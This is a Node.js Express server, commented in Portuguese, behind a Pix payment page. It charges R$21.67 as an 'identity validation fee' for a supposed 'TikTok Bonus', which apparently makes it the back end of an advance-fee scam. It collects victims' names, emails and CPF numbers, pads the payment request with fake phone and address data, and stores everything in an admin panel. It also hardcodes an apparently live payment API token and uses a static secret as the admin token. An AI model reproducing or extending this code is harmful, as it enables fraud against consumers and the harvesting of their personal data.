const express = require('express');
const axios = require('axios');
const adminSystem = require('./admin-system');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚠️ CONFIGURAÇÃO REAL DA PLUMIFY (SUAS CHAVES)
const PLUMIFY_CONFIG = {
    token: '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa',
    accountId: '9kajnnbn2c',
    baseURL: 'https://api.plumify.com.br/api/public/v1',
    productHash: 'flnqw8vjsf'
};

// MIDDLEWARES ESSENCIAIS
app.use(express.json());
app.use(express.static(__dirname));

// CORS PARA PRODUÇÃO
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// HEALTH CHECK (OBRIGATÓRIO PARA RENDER)
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        service: 'TikTok PIX API + Admin',
        environment: process.env.NODE_ENV || 'production',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        admin: 'active'
    });
});

// ROTA PRINCIPAL - REDIRECIONA PARA PAGAMENTO
app.get('/', (req, res) => {
    res.redirect('/pagamento');
});

// ROTA DO PAGAMENTO - PÁGINA PRINCIPAL
app.get('/pagamento', (req, res) => {
    res.sendFile(__dirname + '/pagamento.html');
});

// ROTA DO PAINEL ADMIN
app.get('/admin.html', (req, res) => {
    res.sendFile(__dirname + '/admin.html');
});

// ROTA DO LOGIN ADMIN
app.get('/entrar-admin.html', (req, res) => {
    res.sendFile(__dirname + '/entrar-admin.html');
});

// TESTE DA API
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API TikTok PIX funcionando!',
        server: 'Render',
        url: 'https://pagamento-cgzk.onrender.com',
        plumify: 'Conectado',
        admin: 'Ativo',
        timestamp: new Date().toISOString()
    });
});

// ⭐⭐ ROTA REAL PARA CRIAR PIX (PRODUÇÃO) ⭐⭐
app.post('/api/pix/create', async (req, res) => {
    console.log('=== INICIANDO CRIAÇÃO DE PIX ===');
    
    try {
        // VALIDAÇÃO DOS DADOS
        const { customerName, customerEmail, customerCpf } = req.body;
        
        if (!customerName || !customerEmail || !customerCpf) {
            console.log('❌ Dados incompletos:', req.body);
            return res.status(400).json({
                success: false,
                error: 'Dados incompletos. Preencha: nome, email e CPF.',
                required: ['customerName', 'customerEmail', 'customerCpf']
            });
        }
        
        // LIMPA CPF
        const cpfClean = customerCpf.replace(/\D/g, '');
        console.log('✅ Dados recebidos:', { customerName, customerEmail, cpfClean });
        
        // PAYLOAD PARA PLUMIFY (REAL)
        const payload = {
            api_token: PLUMIFY_CONFIG.token,
            amount: 2167, // R$ 21,67 em centavos
            payment_method: "pix",
            customer: {
                name: customerName.trim(),
                email: customerEmail.trim(),
                phone_number: "61995512071",
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [
                {
                    product_hash: PLUMIFY_CONFIG.productHash,
                    title: "Taxa de Validação de Identidade - TikTok Bônus",
                    price: 2167,
                    quantity: 1,
                    tangible: false,
                    requires_shipping: false,
                    operation_type: 1
                }
            ],
            offer_hash: `tiktok_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        console.log('📤 Enviando para Plumify...');
        
        // CHAMADA REAL PARA API PLUMIFY
        const response = await axios.post(
            `${PLUMIFY_CONFIG.baseURL}/transactions`,
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout: 30000
            }
        );
        
        console.log('✅ Resposta Plumify - Status:', response.status);
        
        // PROCESSAMENTO DA RESPOSTA
        const data = response.data;
        
        // VERIFICA SE TEM ERRO NA RESPOSTA
        if (data.error) {
            console.log('❌ Erro na resposta Plumify:', data.error);
            return res.status(400).json({
                success: false,
                error: data.error.message || 'Erro na geração do PIX',
                details: data.error
            });
        }
        
        // FORMATA RESPOSTA PARA FRONTEND
        const result = {
            success: true,
            message: 'PIX gerado com sucesso!',
            transaction: {
                id: data.id || data.hash || `pix_${Date.now()}`,
                status: data.payment_status || 'waiting_payment',
                amount: 21.67,
                amount_cents: 2167,
                pix_code: data.pix?.pix_qr_code || data.qr_code || data.pix_qr_code || '',
                pix_url: data.pix?.pix_url || data.qr_code_image || data.pix_url || '',
                expiration: data.expires_at || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
                created_at: data.created_at || new Date().toISOString()
            }
        };
        
        // SE NÃO TEM URL DO QR CODE, GERA UMA
        if (result.transaction.pix_code && !result.transaction.pix_url) {
            result.transaction.pix_url = 
                `https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=${encodeURIComponent(result.transaction.pix_code)}`;
        }
        
        console.log('🎯 PIX gerado com sucesso! ID:', result.transaction.id);
        
        // 📋 REGISTRAR NO SISTEMA ADMIN (ASSÍNCRONO - NÃO BLOQUEIA)
        setTimeout(async () => {
            try {
                const paymentData = {
                    id: result.transaction.id,
                    transactionId: data.id || result.transaction.id,
                    customerName: customerName.trim(),
                    customerEmail: customerEmail.trim(),
                    customerCpf: cpfClean,
                    amount: 21.67,
                    status: 'pending',
                    pixCode: result.transaction.pix_code || '',
                    pixUrl: result.transaction.pix_url || '',
                    createdAt: new Date().toISOString()
                };
                
                const registered = adminSystem.addPayment(paymentData);
                if (registered) {
                    console.log(`✅ Pagamento ${result.transaction.id} registrado no admin`);
                }
            } catch (adminError) {
                console.error('❌ Erro ao registrar no admin:', adminError);
                // Não falha o PIX por causa do admin
            }
        }, 100);
        
        // ENVIAR RESPOSTA PARA O FRONTEND
        res.json(result);
        
    } catch (error) {
        console.error('❌ ERRO CRÍTICO NO PIX:');
        console.error('Mensagem:', error.message);
        
        // RESPOSTA DE ERRO DETALHADA
        let errorMessage = 'Erro ao gerar PIX';
        
        if (error.response) {
            errorMessage = error.response.data?.message || error.response.data?.error || `Erro ${error.response.status}`;
        } else if (error.request) {
            errorMessage = 'Sem resposta do servidor de pagamento. Verifique sua conexão.';
        } else {
            errorMessage = error.message;
        }
        
        res.status(error.response?.status || 500).json({
            success: false,
            error: errorMessage,
            suggestion: 'Tente novamente em alguns instantes.'
        });
    }
});

// ==================== ADMIN SYSTEM API ====================

// Middleware de autenticação
const authenticateAdmin = (req, res, next) => {
    const authHeader = req.headers.authorization;
    
    if (!authHeader) {
        console.log('❌ Nenhum token fornecido');
        return res.status(401).json({ 
            success: false, 
            error: 'Token de autenticação necessário' 
        });
    }
    
    const token = authHeader.replace('Bearer ', '');
    
    if (!adminSystem.validateToken(token)) {
        return res.status(401).json({ 
            success: false, 
            error: 'Token inválido ou expirado' 
        });
    }
    
    next();
};

// API Login do Admin
app.post('/api/admin-system/login', (req, res) => {
    const { username, password } = req.body;
    
    console.log('🔐 Tentativa de login admin:', username);
    
    if (adminSystem.validateLogin(username, password)) {
        res.json({
            success: true,
            message: 'Login realizado com sucesso!',
            token: adminSystem.ADMIN_CONFIG.secret,
            user: {
                username: username,
                role: 'admin',
                lastLogin: new Date().toISOString()
            }
        });
    } else {
        res.status(401).json({
            success: false,
            error: 'Credenciais inválidas'
        });
    }
});

// Dashboard do admin
app.get('/api/admin-system/dashboard', authenticateAdmin, (req, res) => {
    try {
        const stats = adminSystem.getStats();
        const recentPayments = adminSystem.getRecentPayments(10);
        
        res.json({
            success: true,
            data: {
                totalRevenue: parseFloat(stats.totalRevenue),
                totalPayments: stats.totalPayments,
                pendingPayments: stats.pendingPayments,
                totalUsers: stats.totalUsers,
                recentPayments: recentPayments,
                chartData: stats.chartData,
                serverInfo: {
                    url: 'https://pagamento-cgzk.onrender.com',
                    status: 'online',
                    uptime: process.uptime(),
                    timestamp: new Date().toISOString()
                }
            }
        });
    } catch (error) {
        console.error('❌ Erro no dashboard:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao carregar dashboard'
        });
    }
});

// Listar todos os pagamentos
app.get('/api/admin-system/payments', authenticateAdmin, (req, res) => {
    try {
        const filter = req.query.status || 'all';
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        
        const result = adminSystem.getAllPayments(filter, page, limit);
        
        res.json({
            success: true,
            payments: result.payments,
            pagination: result.pagination
        });
    } catch (error) {
        console.error('❌ Erro ao listar pagamentos:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao carregar pagamentos'
        });
    }
});

// Atualizar status do pagamento
app.post('/api/admin-system/payments/:id/paid', authenticateAdmin, (req, res) => {
    try {
        const { id } = req.params;
        
        if (adminSystem.updatePaymentStatus(id, 'paid')) {
            res.json({
                success: true,
                message: 'Pagamento marcado como pago!'
            });
        } else {
            res.status(404).json({
                success: false,
                error: 'Pagamento não encontrado'
            });
        }
    } catch (error) {
        console.error('❌ Erro ao atualizar pagamento:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao atualizar pagamento'
        });
    }
});

// Excluir pagamento
app.delete('/api/admin-system/payments/:id', authenticateAdmin, (req, res) => {
    try {
        const { id } = req.params;
        
        if (adminSystem.deletePayment(id)) {
            res.json({
                success: true,
                message: 'Pagamento excluído com sucesso!'
            });
        } else {
            res.status(404).json({
                success: false,
                error: 'Pagamento não encontrado'
            });
        }
    } catch (error) {
        console.error('❌ Erro ao excluir pagamento:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao excluir pagamento'
        });
    }
});

// Exportar dados
app.get('/api/admin-system/export', authenticateAdmin, (req, res) => {
    try {
        const db = adminSystem.getDatabase();
        const format = req.query.format || 'json';
        
        res.json({
            success: true,
            data: db,
            exportedAt: new Date().toISOString(),
            count: db.payments.length
        });
    } catch (error) {
        console.error('❌ Erro ao exportar dados:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao exportar dados'
        });
    }
});

// Limpar dados
app.post('/api/admin-system/clear', authenticateAdmin, (req, res) => {
    try {
        if (adminSystem.clearDatabase()) {
            res.json({
                success: true,
                message: 'Banco de dados limpo com sucesso!'
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Erro ao limpar banco de dados'
            });
        }
    } catch (error) {
        console.error('❌ Erro ao limpar dados:', error);
        res.status(500).json({
            success: false,
            error: 'Erro ao limpar dados'
        });
    }
});

// ROTA PARA VERIFICAR STATUS DO PIX (OPCIONAL)
app.get('/api/pix/status/:id', async (req, res) => {
    try {
        const response = await axios.get(
            `${PLUMIFY_CONFIG.baseURL}/transactions/${req.params.id}`,
            {
                headers: {
                    'Authorization': `Bearer ${PLUMIFY_CONFIG.token}`,
                    'Accept': 'application/json'
                }
            }
        );
        
        res.json({
            success: true,
            transaction: response.data
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Erro ao verificar status'
        });
    }
});

// ROTA PARA SERVIR ARQUIVOS ESTÁTICOS (ADICIONE ESTA ROTA ANTES DA CATCH-ALL)
app.get('*.html', (req, res) => {
    res.sendFile(__dirname + req.path, (err) => {
        if (err) {
            // Se arquivo não encontrado, não redireciona
            res.status(404).send('Página não encontrada');
        }
    });
});

// ROTA PARA IMAGENS, CSS, JS (ADICIONE ESTA ROTA TAMBÉM)
app.get('*.(png|jpg|jpeg|gif|css|js|ico|svg)', (req, res) => {
    res.sendFile(__dirname + req.path, (err) => {
        if (err) {
            res.status(404).send('Arquivo não encontrado');
        }
    });
});

// ROTA PARA TODAS AS OUTRAS REQUESTS - APENAS PARA API (MUDE ISSO)
app.get('*', (req, res) => {
    // Se for uma rota de API, retorna 404
    if (req.path.startsWith('/api/')) {
        return res.status(404).json({
            success: false,
            error: 'Rota da API não encontrada'
        });
    }
    
    // Para qualquer outra coisa, tenta servir como arquivo estático
    res.sendFile(__dirname + req.path, (err) => {
        if (err) {
            // Se não for um arquivo, mostra 404 em vez de redirecionar
            res.status(404).send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>404 - Página não encontrada</title>
                    <style>
                        body { 
                            font-family: Arial, sans-serif; 
                            text-align: center; 
                            padding: 50px; 
                            background: #f5f5f5;
                        }
                        h1 { color: #ff0050; }
                        .container { 
                            max-width: 600px; 
                            margin: 0 auto; 
                            background: white; 
                            padding: 30px; 
                            border-radius: 10px;
                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        }
                        .links { margin-top: 20px; }
                        .links a { 
                            display: inline-block; 
                            margin: 10px; 
                            padding: 10px 20px; 
                            background: #ff0050; 
                            color: white; 
                            text-decoration: none;
                            border-radius: 5px;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>404 - Página não encontrada</h1>
                        <p>A página que você está procurando não existe.</p>
                        <div class="links">
                            <a href="/pagamento">Página de Pagamento</a>
                            <a href="/entrar-admin.html">Admin Login</a>
                            <a href="/admin.html">Painel Admin</a>
                        </div>
                    </div>
                </body>
                </html>
            `);
        }
    });
});

// INICIAR SERVIDOR
app.listen(PORT, () => {
    console.log(`
    🚀 TIKTOK PIX API - PRODUÇÃO COM ADMIN
    ==========================================
    ✅ Servidor iniciado na porta: ${PORT}
    🌐 URL: https://pagamento-cgzk.onrender.com
    💰 Página principal: /pagamento
    👑 Admin login: /entrar-admin.html
    👑 Admin panel: /admin.html
    📊 Health: /health
    💰 API PIX: /api/pix/create
    🔐 Admin API: /api/admin-system/*
    📁 Admin DB: admin-database.json
    🕐 ${new Date().toISOString()}
    ==========================================
    `);
});
app.get('/admin.html', (req, res) => {
    res.sendFile(__dirname + '/admin.html');
});

app.get('/entrar-admin.html', (req, res) => {
    res.sendFile(__dirname + '/entrar-admin.html');
});

app.get('*.css', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.js', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.png', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.jpg', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.jpeg', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.gif', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.svg', (req, res) => {
    res.sendFile(__dirname + req.path);
});

app.get('*.ico', (req, res) => {
    res.sendFile(__dirname + req.path);
});

// ROTA CATCH-ALL SIMPLIFICADA (DEVE SER A ÚLTIMA)
app.get('*', (req, res) => {
    // Se já temos rotas específicas acima, qualquer coisa que chegue aqui é 404
    if (req.path === '/' || req.path === '/pagamento') {
        res.redirect('/pagamento');
    } else if (req.path === '/admin') {
        res.redirect('/admin.html');
    } else if (req.path === '/entrar-admin') {
        res.redirect('/entrar-admin.html');
    } else {
        // Para qualquer outra coisa, tenta servir como arquivo estático
        res.sendFile(__dirname + req.path, (err) => {
            if (err) {
                // Se não encontrar, redireciona para pagamento
                res.redirect('/pagamento');
            }
        });
    }
});